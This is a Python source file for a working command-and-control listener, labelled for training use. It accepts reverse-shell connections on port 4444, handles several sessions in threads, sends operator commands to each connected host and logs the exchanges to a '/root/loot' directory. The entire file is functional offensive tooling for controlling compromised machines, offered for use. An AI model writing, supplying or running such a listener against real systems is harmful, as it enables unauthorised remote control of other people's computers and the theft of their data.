#!/usr/bin/env python3
"""
Simple C2 Listener
Netcat-style listener with logging

For training purposes only
"""

import socket
import threading
import sys
import os
from datetime import datetime

LOG_DIR = "/root/loot"
os.makedirs(LOG_DIR, exist_ok=True)

class C2Listener:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.sessions = {}
        self.session_counter = 0

    def log(self, message, session_id=None):
        """Log message to console and file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        prefix = f"[Session {session_id}]" if session_id else "[*]"
        full_message = f"[{timestamp}] {prefix} {message}"
        print(full_message)

        log_file = os.path.join(LOG_DIR, f"c2_sessions_{datetime.now().strftime('%Y%m%d')}.log")
        with open(log_file, "a") as f:
            f.write(full_message + "\n")

    def handle_client(self, client_socket, address, session_id):
        """Handle individual client connection"""
        self.log(f"New connection from {address}", session_id)

        session_log = os.path.join(LOG_DIR, f"session_{session_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

        try:
            while True:
                # Receive data
                data = client_socket.recv(4096)
                if not data:
                    break

                decoded = data.decode("utf-8", errors="ignore")
                self.log(f"Received: {decoded[:100]}...", session_id)

                # Log to session file
                with open(session_log, "a") as f:
                    f.write(f"[RECV] {decoded}\n")

                # Interactive mode - get command from user
                try:
                    command = input(f"Session {session_id}> ")
                    if command.lower() == "exit":
                        break
                    client_socket.send((command + "\n").encode())

                    with open(session_log, "a") as f:
                        f.write(f"[SEND] {command}\n")
                except EOFError:
                    break

        except Exception as e:
            self.log(f"Error: {e}", session_id)
        finally:
            client_socket.close()
            self.log(f"Session closed", session_id)
            if session_id in self.sessions:
                del self.sessions[session_id]

    def start(self):
        """Start the listener"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server.bind((self.host, self.port))
            server.listen(5)
            self.log(f"Listening on {self.host}:{self.port}")
            self.log("Waiting for connections...")

            while True:
                client_socket, address = server.accept()
                self.session_counter += 1
                session_id = self.session_counter

                self.sessions[session_id] = {
                    "socket": client_socket,
                    "address": address
                }

                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address, session_id)
                )
                client_thread.daemon = True
                client_thread.start()

        except KeyboardInterrupt:
            self.log("Shutting down...")
        finally:
            server.close()

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444

    print("=" * 50)
    print("C2 Listener - Training Use Only")
    print("=" * 50)

    listener = C2Listener(port=port)
    listener.start()
